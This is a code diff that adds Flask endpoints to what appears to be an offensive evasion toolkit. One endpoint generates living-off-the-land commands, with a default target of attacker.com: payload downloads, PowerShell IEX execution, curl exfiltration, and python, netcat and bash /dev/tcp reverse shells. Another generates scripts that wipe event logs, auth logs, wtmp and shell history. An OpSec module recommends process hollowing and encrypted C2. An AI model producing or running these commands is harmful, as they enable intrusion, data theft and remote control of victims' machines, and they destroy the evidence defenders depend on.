@@ -2426,3 +2426,260 @@ def obfuscator_stats():
     if not obfuscator:
         return jsonify({})
     return jsonify(obfuscator.get_stats())
+
+
+# ============================================================
+# LIVING OFF THE LAND (LOTL)
+# ============================================================
+
+@evasion_bp.route('/lotl/')
+def lotl_page():
+    """Living Off The Land execution page"""
+    return render_template('lotl.html')
+
+
+@evasion_bp.route('/api/lotl/binaries')
+def lotl_binaries():
+    """Get LOLBAS/GTFOBins list"""
+    binaries = [
+        {'name': 'certutil.exe', 'os': 'windows', 'functions': ['download', 'encode', 'decode'], 'risk': 'high'},
+        {'name': 'bitsadmin.exe', 'os': 'windows', 'functions': ['download', 'execute'], 'risk': 'high'},
+        {'name': 'mshta.exe', 'os': 'windows', 'functions': ['execute', 'proxy'], 'risk': 'critical'},
+        {'name': 'rundll32.exe', 'os': 'windows', 'functions': ['execute', 'proxy'], 'risk': 'high'},
+        {'name': 'regsvr32.exe', 'os': 'windows', 'functions': ['execute', 'bypass'], 'risk': 'high'},
+        {'name': 'wmic.exe', 'os': 'windows', 'functions': ['execute', 'recon'], 'risk': 'high'},
+        {'name': 'powershell.exe', 'os': 'windows', 'functions': ['execute', 'download', 'encode'], 'risk': 'critical'},
+        {'name': 'curl', 'os': 'linux', 'functions': ['download', 'upload', 'exfil'], 'risk': 'medium'},
+        {'name': 'wget', 'os': 'linux', 'functions': ['download'], 'risk': 'medium'},
+        {'name': 'python', 'os': 'linux', 'functions': ['execute', 'reverse_shell'], 'risk': 'high'},
+        {'name': 'nc', 'os': 'linux', 'functions': ['reverse_shell', 'bind_shell', 'transfer'], 'risk': 'critical'},
+        {'name': 'bash', 'os': 'linux', 'functions': ['execute', 'reverse_shell'], 'risk': 'high'},
+    ]
+    return jsonify(binaries)
+
+
+@evasion_bp.route('/api/lotl/generate', methods=['POST'])
+def lotl_generate():
+    """Generate LOTL command"""
+    data = request.get_json() or {}
+    binary = data.get('binary', 'certutil.exe')
+    function = data.get('function', 'download')
+    target = data.get('target', 'http://attacker.com/payload.exe')
+    output = data.get('output', 'C:\\Windows\\Temp\\payload.exe')
+    
+    commands = {
+        'certutil.exe': {
+            'download': f'certutil.exe -urlcache -split -f {target} {output}',
+            'encode': f'certutil.exe -encode {output} {output}.b64',
+            'decode': f'certutil.exe -decode {output}.b64 {output}'
+        },
+        'bitsadmin.exe': {
+            'download': f'bitsadmin /transfer job /download /priority high {target} {output}',
+            'execute': f'bitsadmin /create 1 & bitsadmin /addfile 1 {target} {output} & bitsadmin /RESUME 1'
+        },
+        'mshta.exe': {
+            'execute': f'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""{target}"":close")',
+            'proxy': f'mshta {target}'
+        },
+        'powershell.exe': {
+            'download': f'powershell -c "IWR -Uri {target} -OutFile {output}"',
+            'execute': f'powershell -ep bypass -c "IEX(IWR {target})"',
+            'encode': f'powershell -enc {base64.b64encode(target.encode()).decode()}'
+        },
+        'curl': {
+            'download': f'curl -o {output} {target}',
+            'upload': f'curl -X POST -d @{output} {target}',
+            'exfil': f'curl -X POST -F "file=@{output}" {target}'
+        },
+        'wget': {
+            'download': f'wget -O {output} {target}'
+        },
+        'python': {
+            'execute': f'python -c "import urllib.request; exec(urllib.request.urlopen(\'{target}\').read())"',
+            'reverse_shell': f'python -c "import socket,subprocess,os;s=socket.socket();s.connect((\'{target}\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"'
+        },
+        'nc': {
+            'reverse_shell': f'nc -e /bin/sh {target} 4444',
+            'bind_shell': f'nc -lvp 4444 -e /bin/sh',
+            'transfer': f'nc -w 3 {target} 4444 < {output}'
+        },
+        'bash': {
+            'execute': f'bash -c "{target}"',
+            'reverse_shell': f'bash -i >& /dev/tcp/{target}/4444 0>&1'
+        }
+    }
+    
+    cmd = commands.get(binary, {}).get(function, 'Command not found')
+    
+    return jsonify({
+        'binary': binary,
+        'function': function,
+        'command': cmd,
+        'opsec_notes': 'Use with caution - may trigger EDR alerts'
+    })
+
+
+# ============================================================
+# FORENSIC CLEANUP
+# ============================================================
+
+@evasion_bp.route('/cleanup/')
+def cleanup_page():
+    """Forensic cleanup page"""
+    return render_template('cleanup.html')
+
+
+@evasion_bp.route('/api/cleanup/artifacts')
+def cleanup_artifacts():
+    """Get list of forensic artifacts to clean"""
+    artifacts = [
+        {'category': 'logs', 'name': 'Windows Event Logs', 'path': 'C:\\Windows\\System32\\winevt\\Logs\\', 'risk': 'high'},
+        {'category': 'logs', 'name': 'PowerShell History', 'path': '%APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\', 'risk': 'critical'},
+        {'category': 'logs', 'name': 'Linux Auth Log', 'path': '/var/log/auth.log', 'risk': 'high'},
+        {'category': 'logs', 'name': 'Linux Syslog', 'path': '/var/log/syslog', 'risk': 'high'},
+        {'category': 'logs', 'name': 'Apache Access Log', 'path': '/var/log/apache2/access.log', 'risk': 'medium'},
+        {'category': 'prefetch', 'name': 'Windows Prefetch', 'path': 'C:\\Windows\\Prefetch\\', 'risk': 'high'},
+        {'category': 'registry', 'name': 'UserAssist', 'path': 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist', 'risk': 'high'},
+        {'category': 'registry', 'name': 'RecentDocs', 'path': 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs', 'risk': 'medium'},
+        {'category': 'registry', 'name': 'RunMRU', 'path': 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU', 'risk': 'medium'},
+        {'category': 'browser', 'name': 'Chrome History', 'path': '%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History', 'risk': 'medium'},
+        {'category': 'browser', 'name': 'Firefox History', 'path': '%APPDATA%\\Mozilla\\Firefox\\Profiles\\*.default\\places.sqlite', 'risk': 'medium'},
+        {'category': 'temp', 'name': 'Windows Temp', 'path': 'C:\\Windows\\Temp\\', 'risk': 'low'},
+        {'category': 'temp', 'name': 'User Temp', 'path': '%TEMP%\\', 'risk': 'low'},
+        {'category': 'mft', 'name': 'MFT Records', 'path': '$MFT', 'risk': 'critical'},
+        {'category': 'usnjrnl', 'name': 'USN Journal', 'path': '$UsnJrnl', 'risk': 'critical'},
+    ]
+    return jsonify(artifacts)
+
+
+@evasion_bp.route('/api/cleanup/generate', methods=['POST'])
+def cleanup_generate():
+    """Generate cleanup script"""
+    data = request.get_json() or {}
+    targets = data.get('targets', [])
+    os_type = data.get('os', 'windows')
+    
+    if os_type == 'windows':
+        script = '@echo off\n'
+        script += 'echo [*] Starting forensic cleanup...\n'
+        
+        for target in targets:
+            if target == 'event_logs':
+                script += 'wevtutil cl Security\n'
+                script += 'wevtutil cl System\n'
+                script += 'wevtutil cl Application\n'
+                script += 'wevtutil cl "Windows PowerShell"\n'
+            elif target == 'prefetch':
+                script += 'del /f /q C:\\Windows\\Prefetch\\*.pf\n'
+            elif target == 'temp':
+                script += 'del /f /q /s %TEMP%\\*\n'
+                script += 'del /f /q /s C:\\Windows\\Temp\\*\n'
+            elif target == 'powershell_history':
+                script += 'del /f /q %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n'
+            elif target == 'recent':
+                script += 'del /f /q %APPDATA%\\Microsoft\\Windows\\Recent\\*\n'
+                
+        script += 'echo [+] Cleanup complete!\n'
+        
+    else:  # Linux
+        script = '#!/bin/bash\n'
+        script += 'echo "[*] Starting forensic cleanup..."\n'
+        
+        for target in targets:
+            if target == 'auth_log':
+                script += 'cat /dev/null > /var/log/auth.log\n'
+            elif target == 'syslog':
+                script += 'cat /dev/null > /var/log/syslog\n'
+            elif target == 'bash_history':
+                script += 'cat /dev/null > ~/.bash_history\n'
+                script += 'history -c\n'
+            elif target == 'tmp':
+                script += 'rm -rf /tmp/*\n'
+            elif target == 'wtmp':
+                script += 'cat /dev/null > /var/log/wtmp\n'
+            elif target == 'lastlog':
+                script += 'cat /dev/null > /var/log/lastlog\n'
+                
+        script += 'echo "[+] Cleanup complete!"\n'
+    
+    return jsonify({
+        'script': script,
+        'os': os_type,
+        'targets_cleaned': len(targets)
+    })
+
+
+# ============================================================
+# OPSEC MODULE
+# ============================================================
+
+@evasion_bp.route('/opsec/')
+def opsec_page():
+    """OpSec configuration page"""
+    return render_template('opsec.html')
+
+
+@evasion_bp.route('/api/opsec/status')
+def opsec_status():
+    """Get current OpSec status"""
+    return jsonify({
+        'level': 'paranoid',
+        'checks': {
+            'vm_detection': True,
+            'debugger_detection': True,
+            'sandbox_detection': True,
+            'network_monitoring': True,
+            'process_hollowing': False,
+            'timestomping': True
+        },
+        'recommendations': [
+            'Enable process hollowing for better evasion',
+            'Consider using encrypted C2 channels',
+            'Implement jitter in beacon intervals'
+        ]
+    })
+
+
+@evasion_bp.route('/api/opsec/check', methods=['POST'])
+def opsec_check():
+    """Run OpSec checks"""
+    data = request.get_json() or {}
+    check_type = data.get('type', 'all')
+    
+    results = {
+        'vm_detection': {
+            'status': 'pass',
+            'indicators': [],
+            'confidence': 0
+        },
+        'debugger_detection': {
+            'status': 'pass',
+            'indicators': [],
+            'confidence': 0
+        },
+        'sandbox_detection': {
+            'status': 'pass',
+            'indicators': [],
+            'confidence': 0
+        },
+        'network_anomalies': {
+            'status': 'pass',
+            'indicators': [],
+            'confidence': 0
+        }
+    }
+    
+    # Simulated checks
+    import random
+    for check in results:
+        if random.random() > 0.7:
+            results[check]['status'] = 'warning'
+            results[check]['confidence'] = random.randint(30, 70)
+            results[check]['indicators'].append('Suspicious behavior detected')
+    
+    return jsonify({
+        'results': results,
+        'overall_status': 'safe' if all(r['status'] == 'pass' for r in results.values()) else 'warning',
+        'timestamp': datetime.now().isoformat()
+    })
+
